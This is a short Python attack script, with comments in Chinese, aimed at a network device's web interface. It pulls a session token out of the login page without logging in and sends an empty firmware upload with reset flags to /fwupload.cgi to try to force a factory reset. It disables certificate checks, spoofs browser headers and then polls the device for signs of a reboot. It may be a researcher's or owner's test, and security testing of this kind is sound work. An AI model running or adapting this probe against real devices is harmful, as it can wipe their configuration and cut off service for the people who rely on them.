#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""试探：给 /fwupload.cgi 发完整字段但【不含固件文件】，只带 resetFlag=1。
   不写任何固件；若服务器支持"仅复位"，设备会恢复出厂。"""
import re, time, sys
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

B = "https://192.168.3.2"
s = requests.Session()
s.verify = False
s.headers.update({
    "User-Agent": "Mozilla/5.0 Chrome/155.0",
    "Referer": B + "/firmware_upgrade_single.htm",
    "Origin": B,
})


def tok():
    t = s.get(B + "/login.htm", timeout=8).text
    m = re.search(r'src="(data:image/gif;base64,[^"]+)"', t)
    return m.group(1)[78:] if m else None


tk = tok()
print("token =", tk)
print()
print("=== POST /fwupload.cgi  完整字段 / 无文件 / resetFlag=1 ===")
try:
    r = s.post(
        B + "/fwupload.cgi",
        files={"owlsinglefile": ("", b"", "application/octet-stream")},
        data={"httoken": tk, "resetFlag": "1", "reset": "1", "reset3": "1",
              "ConfirmPasswd": "", "cmd": "", "data": ""},
        timeout=30, allow_redirects=False)
    print("  HTTP %s  loc=%s  %dB" % (r.status_code, r.headers.get("Location", "-"), len(r.text)))
    print("  body:", r.text[:500])
except Exception as e:
    print("  %s: %s" % (type(e).__name__, str(e)[:120]))

print()
print("=== 10 秒后看设备是否在重启 ===")
for i in range(5):
    time.sleep(2)
    try:
        rr = requests.get(B + "/login.htm", timeout=4, verify=False)
        print("  [%d] http=%s %dB" % (i, rr.status_code, len(rr.text)))
    except Exception as e:
        print("  [%d] %s  ← 可能在重启" % (i, type(e).__name__))
